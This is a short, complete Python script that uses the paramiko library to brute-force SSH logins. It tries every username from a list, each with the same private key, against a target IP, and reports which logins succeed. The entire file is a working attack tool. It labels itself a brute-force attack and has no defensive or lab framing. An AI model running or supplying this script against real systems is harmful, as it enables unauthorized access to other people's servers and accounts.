import paramiko
import sys
import argparse

def ssh_login(target_ip, username, private_key_path):
    """
    Attempts to SSH into the target IP using the given username and private key.
    Returns True if successful, otherwise returns False.
    """
    try:
        key = paramiko.RSAKey.from_private_key_file(private_key_path)
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Attempt to connect
        client.connect(hostname=target_ip, username=username, pkey=key, timeout=5)
        client.close()
        return True

    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"Error with {username}: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="SSH brute-force script with username list and SSH key.")
    parser.add_argument("target_ip", help="The target IP address for SSH.")
    parser.add_argument("username_file", help="File containing the list of usernames.")
    parser.add_argument("private_key_path", help="Path to the SSH private key.")

    args = parser.parse_args()

    target_ip = args.target_ip
    username_file = args.username_file
    private_key_path = args.private_key_path

    # Lists to hold successful and failed attempts
    successes = []
    failures = []

    try:
        with open(username_file, "r") as file:
            usernames = file.read().splitlines()
    except FileNotFoundError:
        print(f"Error: File '{username_file}' not found.")
        sys.exit(1)

    print(f"Starting SSH brute-force on {target_ip}...\n")
    for username in usernames:
        if ssh_login(target_ip, username, private_key_path):
            print(f"[SUCCESS] {username}")
            successes.append(username)
        else:
            print(f"[FAILURE] {username}")
            failures.append(username)

    # Reporting results
    print("\nBrute-force attack completed.")
    print("\nSuccessful logins:")
    for success in successes:
        print(f" - {success}")

    print("\nFailed logins:")
    for failure in failures:
        print(f" - {failure}")

if __name__ == "__main__":
    main()
